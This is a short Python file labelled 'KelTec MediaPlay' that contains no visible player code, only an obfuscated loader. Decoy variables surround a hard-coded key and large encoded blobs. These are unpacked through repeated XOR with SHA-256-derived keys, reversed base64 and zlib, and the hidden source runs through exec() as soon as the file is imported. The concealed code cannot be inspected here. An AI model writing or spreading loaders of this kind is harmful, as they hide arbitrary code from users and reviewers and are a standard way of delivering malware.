# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 240073 ^ 110465
_lx1_1 = len("fc26d1")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-557742)
_lx3_3 = 191305 * 0
_lx4_4 = 950268 ^ 111425
_K = 'b80164d367c99e2f56a053705757b774bca85f631db7e1c1391ff56764cbe802'
_M = 'nDhC6xPVU84npuhZibPCi5k6jY83pfMIlz9Pbga4R03AZhTkUI5ZlSnw4FrbsMbdnjaO32aj8ViWaklrVb4VEJwxQrxS1V3Pf/fn'
_D = 'opxxE/VSuGz8OulipUO7X32L6DFnuNtEBC3MYTK6k7QIumOpUe2ScYnlkolUzYEabOl+ajjVDCozLT2oeD4d8tVz1svy+hQ3wtK5Cy+lMhn92FIjSMneSvI6RgLr63lHT9tQ0iKn5v6qHeV1lUJVM8hyVFrAKUhDe6XvVDYvynSj0kah7gcJ4gbLXi0HCYYbFidDlUHxuj+aE8s0Yyd+zsFmrpZnGtNTpjuWbKOxQpnAM3NLQnR4AZ/g8KQf9W5AkzY/qhmTHweFouORcDhJTZia11dZPn6mNA9FlBlWtoYPZBtVyfPBWXcGI4oqN7KBiPOw0TcX0BpETNUFveC3GoW0JvkKNdiHNjFW5s07ju2YPQvz4ZF/PzPi443+D/akkEMEVqvpXp0HlaWoo1jr5g6zuKx8AQQPVckXMpK29tKBYgOfoqqEZWWPYsAW5dSHcUdYHKeg/9TCge7LF9H+2wNYLklFGeme4qvkWNAOlIzIiVkrzaRd9sxt3ClBRGI0020bBsKhyFJ36cOBBmGrYZSKWkbtqlp00VIs47wphqlASdplfss3p+DttV2mt8nPl2jP4z9hO31TKXlVBQkyIGnf1jus4Rpu2jxq4ibc4VmrSmDl1ux4sp8oq2IW118d2GmSKPUa4qfheG0kb4bmtKzEZFLpqGTwLy48RyGqWmHWeB38Z6EHSdtQiGgR8eUjNo6duiFnfMciXSjqB/7AYNIJnsRWtOuRwiMYeeGFGR7fKsW01Xang/g9wJguPXCFCbNRO6tZgyWFcI4I25XwgB6VU2IKi1QmJsDEnQlWQa1y9NIjbWQ3qCrTR/jJ+UibRvu+5RtE1FawFH3z297aP11Ss7MaPe4NQjCMnLyy9A59c67jFDiZ0FCp7/LBvF6YhQD9HW4TbzxYZoAfT18Q2/ZkufGC0rN0eISE1noobfOKR9jHN3x2NBEI4QT4uwThNNF9aTt7ykeWBOKw+ly+EZ5lg28Y+CF5bXVMqpWEG9PEXWwV9MNEIGR2GP33tUMS5J5FVbQqIgj4UEFL140xQ3NNhrc1u6pM9LZAJH6Yz5VK2s/k/5tzuXVEzqqL61A45GbiupiPzj5U/8HGMdoQFlXjv2XNa4Jc4QvaHc4Tprz1Kr+7bs3+lUJWX5/1XBQf3O70h3z6t1MSL57PiXEG4JBbPRGdx+cYv3+h7dAP25NKngRzFugKSzrzTp7EsU+QYzl/u5BT+F3maS7NwRL3qPSFpKkdwVwHvLPxXp5xM+QiGoZ5KdTGtradjQkvAGFo2fqMSW/fuzXWOiUB6Id16Q6kKlVvF9CRR0s5l7ojVH7GJGzWjTLEB6S6jiL/g2TiOlWN0g2VTcXbWSO73bPMBAFNSEHtO0Y5hZNsN4rKDkNhGd8Wm8BI/ylR7pS7d9/daIfGY2EJCN8j89J+RDsB+gchmyhwFPLux/29lhfS3CcCiW1acj0VnvSu/PLR9+mcEtJqaXzd9jhgBBfsE2wkbK3KHihp3eYfZknKrL3YWG29pe1+IIyx0GPNVnzC1J2mwO0AVm3cNRMipVmTVAuh80hYww27gKod/JK9nob1WfJwGoTxsrV/KD8wjXTTIylmQPdLmLKpZdsq1ahVWQ744iTPzREvEQex5di+by7Z5yZKzPToFuol/1bawtx8iv3vbLT1gfDgEzctzKPJEJ1uUIrBNoxxbA+p+5GYoDsChqyahVTWNVhoj8l5SKcvn3nAuU6ji6ks4atBRoh/6RVWxPzlMAFF8JxaLuxQjt5JE7JdRWptqLjBvbCCBcytoJHvYZQNyyCSzUNuUu0C6UU/O+WIkiUS++3lttB3X8haE+y9VZelFRWnYo3ijNXyr3SE'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})